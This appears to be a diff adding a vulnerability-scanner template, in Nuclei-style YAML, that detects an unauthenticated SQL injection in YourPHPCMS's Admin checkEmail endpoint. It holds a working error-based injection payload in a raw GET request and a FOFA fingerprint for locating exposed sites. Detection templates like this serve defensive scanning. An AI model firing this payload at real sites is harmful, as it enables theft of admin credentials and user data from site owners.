@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - qpkkq1qbbvq1
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=%27+AND+%28SELECT+2578+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x71706b6b71%2C%28SELECT+%28ELT%282578%3D2578%2C1%29%29%29%2C0x7162627671%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+xmVt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+id: YourPHPCMS-checkEmail-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: header="YP_onlineid"
+        YourPHPCMS /index.php?g=Admin&m=Login&a=checkEmail 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: YourPHPCMS checkEmail SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/uegecenDDM1nMPhKVix3tQ?token=1543860814&lang=zh_CN
+    severity: high
+    tags: []
